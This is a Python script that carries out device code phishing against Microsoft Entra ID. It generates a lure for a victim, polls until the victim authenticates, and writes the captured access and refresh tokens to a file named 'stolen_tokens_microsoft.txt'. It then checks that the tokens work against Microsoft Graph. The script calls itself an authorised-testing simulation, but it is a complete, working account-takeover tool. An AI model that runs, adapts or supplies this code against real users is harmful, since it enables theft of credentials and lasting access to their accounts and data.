#!/usr/bin/env python3
"""
device_code_phish_sim.py – Simulate device code phishing against Microsoft Entra ID.
Now saves full tokens to a .txt file.
For authorised security testing ONLY.
"""

import requests
import time
import sys
import json                     # <-- NEW: for writing the token file

# ---------- Configuration ----------
TENANT_ID = "your-tenant-id"               # or "common" / "organizations" / "consumers"
CLIENT_ID = "your-client-id"               # App registration ID (e.g., for a legitimate-looking app)
RESOURCE  = "https://graph.microsoft.com"  # or "https://outlook.office365.com" etc.
POLL_INTERVAL = 5                          # seconds between token polls

# Microsoft Entra ID OAuth2 endpoints
DEVICE_CODE_URL = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode"
TOKEN_URL       = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token"

def get_device_code():
    """Request a device code from Entra ID."""
    data = {
        "client_id": CLIENT_ID,
        "scope": f"{RESOURCE}/.default offline_access"  # offline_access for refresh token
    }
    resp = requests.post(DEVICE_CODE_URL, data=data)
    resp.raise_for_status()
    return resp.json()

def poll_for_token(device_code):
    """Continuously poll the token endpoint until the user authenticates."""
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": CLIENT_ID,
        "device_code": device_code
    }
    while True:
        resp = requests.post(TOKEN_URL, data=data)
        json_resp = resp.json()
        if resp.status_code == 200:
            print("\n[+] Tokens obtained!")
            return json_resp
        elif json_resp.get("error") == "authorization_pending":
            print("[*] Waiting for user to complete authentication...")
        elif json_resp.get("error") == "slow_down":
            print("[!] Polling too fast, slowing down.")
            time.sleep(POLL_INTERVAL + 5)
        elif json_resp.get("error") == "expired_token":
            print("[-] Device code expired.")
            return None
        elif json_resp.get("error") == "authorization_declined":
            print("[-] User declined the authentication.")
            return None
        else:
            print(f"[!] Unexpected response: {json_resp}")
            return None
        time.sleep(POLL_INTERVAL)

def main():
    print("[*] Requesting device code...")
    try:
        device_code_resp = get_device_code()
    except Exception as e:
        print(f"[-] Failed to get device code: {e}")
        sys.exit(1)

    user_code     = device_code_resp["user_code"]
    verification_uri = device_code_resp["verification_uri"]
    device_code   = device_code_resp["device_code"]
    expires_in    = device_code_resp.get("expires_in", 900)
    message       = device_code_resp.get("message")

    # This is the lure that the attacker would send to the victim.
    print("\n========== PHISHING LURE ==========")
    print(f"Please go to: {verification_uri}")
    print(f"And enter the code: {user_code}")
    print(f"Code expires in {expires_in} seconds.")
    print("===================================\n")
    print(message)

    # In a real phishing scenario, the attacker delivers this via email/chat.
    # For testing, you could manually send this to the consented test user.

    input("Press Enter once you have sent the code to the test user...")

    tokens = poll_for_token(device_code)
    if tokens:
        # --- NEW: Save tokens to a file ---
        token_file = "stolen_tokens_microsoft.txt"
        try:
            with open(token_file, "w") as f:
                json.dump(tokens, f, indent=2)
            print(f"[+] Full token response saved to {token_file}")
        except Exception as e:
            print(f"[!] Could not save token file: {e}")

        print("\n[+] Access Token (truncated):", tokens["access_token"][:50] + "...")
        if "refresh_token" in tokens:
            print("[+] Refresh Token (truncated):", tokens["refresh_token"][:50] + "...")

        # Example: call Microsoft Graph API to prove token works
        graph_resp = requests.get(
            "https://graph.microsoft.com/v1.0/me",
            headers={"Authorization": f"Bearer {tokens['access_token']}"}
        )
        print("[+] Graph API /me response:", graph_resp.json())

if __name__ == "__main__":
    main()